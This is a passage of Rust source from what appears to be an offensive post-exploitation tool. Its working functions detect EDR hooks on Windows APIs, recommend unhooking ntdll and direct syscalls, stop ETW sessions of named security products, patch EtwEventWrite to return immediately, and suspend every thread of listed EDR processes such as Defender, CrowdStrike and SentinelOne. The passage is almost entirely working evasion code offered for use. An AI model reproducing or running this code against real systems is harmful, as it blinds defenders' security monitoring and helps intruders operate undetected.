        ("ntdll.dll", "NtSuspendThread"),
        ("ntdll.dll", "NtUnmapViewOfSection"),
        ("ntdll.dll", "NtWriteFile"),
        ("kernel32.dll", "VirtualAllocEx"),
        ("kernel32.dll", "WriteProcessMemory"),
        ("kernel32.dll", "CreateRemoteThread"),
        ("kernel32.dll", "VirtualProtectEx"),
        ("kernelbase.dll", "VirtualAlloc"),
        ("kernelbase.dll", "LoadLibraryExW"),
    ];

    let mut results = Vec::new();
    let mut hooked_count = 0u32;

    for (module, function) in &critical_functions {
        let check_args = serde_json::json!({ "module": module, "function": function });
        match detect_hook_on_function(&check_args) {
            Ok(result) => {
                let is_hooked = result
                    .get("is_hooked")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                if is_hooked {
                    hooked_count += 1;
                }
                results.push(serde_json::json!({
                    "module": module,
                    "function": function,
                    "hooked": is_hooked,
                    "hook_type": result.get("hook_type"),
                }));
            }
            Err(_) => {
                results.push(serde_json::json!({
                    "module": module,
                    "function": function,
                    "hooked": "error",
                    "hook_type": "check_failed",
                }));
            }
        }
    }

    let edr_aggressiveness = if hooked_count == 0 {
        "NONE"
    } else if hooked_count <= 5 {
        "LIGHT"
    } else if hooked_count <= 12 {
        "MODERATE"
    } else {
        "AGGRESSIVE"
    };

    Ok(serde_json::json!({
        "success": true,
        "technique": "quick_hook_check",
        "functions_checked": results.len(),
        "hooked_count": hooked_count,
        "edr_aggressiveness": edr_aggressiveness,
        "results": results,
        "recommendations": match edr_aggressiveness {
            "NONE" => vec!["No hooks detected. Standard API calls should work."],
            "LIGHT" => vec!["Light hooking. Use direct syscalls for hooked Nt* functions."],
            "MODERATE" => vec![
                "Moderate EDR hooks. Use unhook_ntdll to restore clean copy, then proceed.",
                "Or use direct/indirect syscalls to bypass hooked functions.",
            ],
            _ => vec![
                "Aggressive EDR hooking. Multi-layered evasion required:",
                "1. unhook_ntdll (restore .text from disk)",
                "2. Direct syscalls via Hell's Gate/Halo's Gate",
                "3. Indirect syscalls with ROP gadgets",
                "4. Consider manual syscall stubs"
            ],
        },
        "message": format!("{}/{} critical APIs hooked (EDR: {})", hooked_count, results.len(), edr_aggressiveness)
    }))
}

/// Mass ETW provider removal — disable ALL user-mode ETW tracing sessions
/// Enumerates active sessions and patches provider enable callbacks
pub fn etw_mass_disable(args: &Value) -> Result<Value, MemoricError> {
    let aggressive = args
        .get("aggressive")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!(
        "[EVASION] Mass ETW provider disable (aggressive={})",
        aggressive
    );

    let mut disabled_count = 0u32;
    let mut session_names = Vec::new();

    // Method 1: Stop known EDR ETW sessions via ControlTrace
    let known_sessions = [
        "Circular Kernel Context Logger",
        "Diagtrack-Listener",
        "EventLog-Security",
        "EventLog-System",
        "EventLog-Application",
        "SenseIR",  // Microsoft Defender for Endpoint
        "SenseNdr", // Defender network
        "MsMpEng",  // Defender engine
        "WdNisSvc", // Defender NIS
        "CrowdStrike",
        "CbDefense",
        "SentinelOne",
        "CarbonBlack",
        "CylanceAVTrace",
    ];

    // Use EventTraceProperties + ControlTrace(STOP)
    unsafe {
        type ControlTraceWFn = unsafe extern "system" fn(
            TraceHandle: u64,
            InstanceName: *const u16,
            Properties: *mut u8,
            ControlCode: u32,
        ) -> u32;

        let advapi32_w: Vec<u16> = "advapi32.dll\0".encode_utf16().collect();
        let advapi32 = windows::Win32::System::LibraryLoader::GetModuleHandleW(
            windows::core::PCWSTR(advapi32_w.as_ptr()),
        );
        if let Ok(advapi32) = advapi32 {
            let control_fn = windows::Win32::System::LibraryLoader::GetProcAddress(
                advapi32,
                windows::core::PCSTR(b"ControlTraceW\0".as_ptr()),
            );
            if let Some(func) = control_fn {
                let control_trace: ControlTraceWFn = std::mem::transmute(func);

                for session_name in &known_sessions {
                    // EVENT_TRACE_PROPERTIES structure + session name buffer
                    let mut props_buf = vec![0u8; 1024];
                    // Set Wnode.BufferSize = 1024
                    props_buf[0..4].copy_from_slice(&1024u32.to_le_bytes());
                    // Set LoggerNameOffset = 120 (after EVENT_TRACE_PROPERTIES)
                    props_buf[44..48].copy_from_slice(&120u32.to_le_bytes());

                    let session_w: Vec<u16> = session_name
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect();

                    // ControlCode 1 = EVENT_TRACE_CONTROL_STOP
                    let result = control_trace(
                        0,
                        session_w.as_ptr(),
                        props_buf.as_mut_ptr(),
                        1, // STOP
                    );

                    if result == 0 {
                        disabled_count += 1;
                        session_names.push(session_name.to_string());
                    }
                }
            }
        }
    }

    // Method 2: Patch EtwEventWrite in ntdll to ret 0 (if aggressive)
    let patched_etwwrite = if aggressive {
        unsafe {
            let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
            if let Ok(ntdll) = windows::Win32::System::LibraryLoader::GetModuleHandleW(
                windows::core::PCWSTR(ntdll_w.as_ptr()),
            ) {
                let etw_write = windows::Win32::System::LibraryLoader::GetProcAddress(
                    ntdll,
                    windows::core::PCSTR(b"EtwEventWrite\0".as_ptr()),
                );
                if let Some(addr) = etw_write {
                    let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
                    if windows::Win32::System::Memory::VirtualProtect(
                        addr as *mut _,
                        4,
                        windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    )
                    .is_ok()
                    {
                        // xor eax, eax; ret = 0x33 0xC0 0xC3
                        let patch = [0x33u8, 0xC0, 0xC3];
                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, 3);
                        let _ = windows::Win32::System::Memory::VirtualProtect(
                            addr as *mut _,
                            4,
                            old_protect,
                            &mut old_protect,
                        );
                        true
                    } else {
                        false
                    }
                } else {
                    false
                }
            } else {
                false
            }
        }
    } else {
        false
    };

    Ok(serde_json::json!({
        "success": true,
        "technique": "etw_mass_disable",
        "aggressive": aggressive,
        "sessions_stopped": disabled_count,
        "stopped_sessions": session_names,
        "etw_event_write_patched": patched_etwwrite,
        "message": format!("Stopped {} ETW sessions, EtwEventWrite patched: {}", disabled_count, patched_etwwrite)
    }))
}

/// Suspend EDR processes — freeze EDR process threads to prevent telemetry
pub fn suspend_edr_processes(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, Thread32First, Thread32Next,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use windows::Win32::System::Threading::{OpenThread, SuspendThread, THREAD_SUSPEND_RESUME};

    let target = args.get("target").and_then(|v| v.as_str());
    let edr_only = args
        .get("edr_only")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::warn!("[EVASION] Suspending EDR processes");

    let edr_names: Vec<&str> = vec![
        "msmpeng.exe",
        "mssense.exe",
        "sensecm.exe",
        "senseir.exe",
        "csfalconservice.exe",
        "csfalconcontainer.exe",
        "cbdefense.exe",
        "repwsc.exe",
        "repux.exe",
        "sentinelagent.exe",
        "sentinelone.exe",
        "cylanceui.exe",
        "cylancesvc.exe",
        "taniumclient.exe",
        "taniumdetectengine.exe",
        "elasticendpoint.exe",
    ];

    let mut suspended = Vec::new();

    unsafe {
        // Find target PIDs
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Snapshot: {}", e)))?;
        let mut pe = PROCESSENTRY32W::default();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        let mut target_pids = Vec::new();
        if Process32FirstW(snap, &mut pe).is_ok() {
            loop {
                let name = String::from_utf16_lossy(
                    &pe.szExeFile[..pe
                        .szExeFile
                        .iter()
                        .position(|&c| c == 0)
                        .unwrap_or(pe.szExeFile.len())],
                )
                .to_lowercase();

                let should_suspend = if let Some(t) = target {
                    name.contains(&t.to_lowercase())
                } else if edr_only {
                    edr_names.iter().any(|&edr| name == edr)
                } else {
                    false
                };

                if should_suspend {
                    target_pids.push((pe.th32ProcessID, name.clone()));
                }
                if Process32NextW(snap, &mut pe).is_err() {
                    break;
                }
            }
        }
        let _ = windows::Win32::Foundation::CloseHandle(snap);

        // Suspend all threads of target processes
        let tsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Thread snapshot: {}", e)))?;
        let mut te = THREADENTRY32::default();
        te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(tsnap, &mut te).is_ok() {
            loop {
                for (pid, name) in &target_pids {
                    if te.th32OwnerProcessID == *pid {
                        if let Ok(thread) =
                            OpenThread(THREAD_SUSPEND_RESUME, false, te.th32ThreadID)
                        {
                            let _ = SuspendThread(thread);
                            let _ = windows::Win32::Foundation::CloseHandle(thread);
                            suspended.push(serde_json::json!({
                                "pid": pid,
                                "tid": te.th32ThreadID,
                                "process": name,
                            }));
                        }
                    }
                }
                if Thread32Next(tsnap, &mut te).is_err() {
                    break;
                }
            }
        }
        let _ = windows::Win32::Foundation::CloseHandle(tsnap);
    }

    Ok(serde_json::json!({
        "success": true,
        "technique": "suspend_edr_processes",
        "threads_suspended": suspended.len(),
        "suspended": suspended,
        "message": format!("Suspended {} EDR threads", suspended.len())
    }))
}
